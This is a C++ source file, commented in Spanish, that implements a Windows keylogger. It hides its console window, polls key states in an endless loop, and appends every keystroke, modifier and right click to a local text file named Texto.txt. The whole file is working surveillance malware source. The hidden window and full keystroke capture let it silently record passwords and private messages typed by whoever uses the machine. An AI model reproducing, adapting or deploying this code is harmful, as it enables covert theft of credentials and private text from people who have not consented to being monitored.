#include <iostream> //libreria estandar para operaciones de entrada
#include <Windows.h> //Libreria con funciones de la biblioteca de API Windows
#include <fstream> //Manejo de archivos de entrada y salida
#include <string> //Libreria de strings

using namespace std;

//Funcion para escritura y creacion o edicion de archivo txt
void escribirArchivo(LPCSTR texto){
    ofstream archivo; //Variable de archivo de salida

    //Apertura del archivo
    archivo.open("Texto.txt", fstream::app);
    //En el caso de no encontrar el archivo, lo genera automaticamente

    //Escritura de archivo
    archivo << texto;
    //Cerrar la escritura de archivo
    archivo.close();
}

//Funcion para caracteres especiales basicos

bool teclasPulsadas(int tecla){
    switch (tecla) {
	case VK_SPACE:
		cout << " ";
		escribirArchivo(" ");
		return true;
	case VK_RETURN:
		cout << "\n";
		escribirArchivo("\n");
		return true;
	case '¾':
		cout << ".";
		escribirArchivo(".");
		return true;
	case VK_SHIFT:
		cout << "#SHIFT#";
		escribirArchivo(" #SHIFT# ");
		return true;
	case VK_BACK:
		cout << "\b";
		escribirArchivo("\b");
		return true;
	case VK_RBUTTON:
		cout << "#R_CLICK#";
		escribirArchivo(" #R_CLICK# ");
		return true;
	case VK_CAPITAL:
		cout << "#CAPS_LOCK#";
		escribirArchivo(" #CAPS_LOCK ");
		return true;
	case VK_TAB:
		cout << "#TAB";
		escribirArchivo(" #TAB ");
		return true;
	case VK_UP:
		cout << "#UP";
		escribirArchivo(" #UP_ARROW_KEY ");
		return true;
	case VK_DOWN:
		cout << "#DOWN";
		escribirArchivo(" #DOWN_ARROW_KEY ");
		return true;
	case VK_LEFT:
		cout << "#LEFT";
		escribirArchivo(" #LEFT_ARROW_KEY ");
		return true;
	case VK_RIGHT:
		cout << "#RIGHT";
		escribirArchivo(" #RIGHT_ARROW_KEY ");
		return true;
	case VK_CONTROL:
		cout << "#CONTROL";
		escribirArchivo(" #CONTROL ");
		return true;
	case VK_MENU:
		cout << "#ALT";
		escribirArchivo(" #ALT ");
		return true;
	default:
		return false;
	}
}

int main()
{
    ShowWindow(GetConsoleWindow(), SW_HIDE); //Llamada al metodo ShowWindow para esconder la consola
    char key; //Variable para el almacenado de cada tecla pulsada
    while(TRUE){
        Sleep(10); //Tiempo de espera en milisegundos despues de cada loop

        //Manejo de reconocimiento de caracteres
        //de acuerdo a la tabla ASCII
        for(key = 8;key<=190;key++){

            /*Si la tecla ha sido pulsada o esta siendo pulsada*/

            if(GetAsyncKeyState(key) == -32767){
                //Si no es un caracter especial
                if(teclasPulsadas(key) == FALSE){
                    ofstream archivo; //Variable de archivo de salida
                    archivo.open("Texto.txt", fstream::app); //Apertura o creacion de archivo
                    archivo << key; //Escritura de la tecla pulsada en el archivo
                    archivo.close(); //Cierre de escritura
                }
            }
        }
    }
}
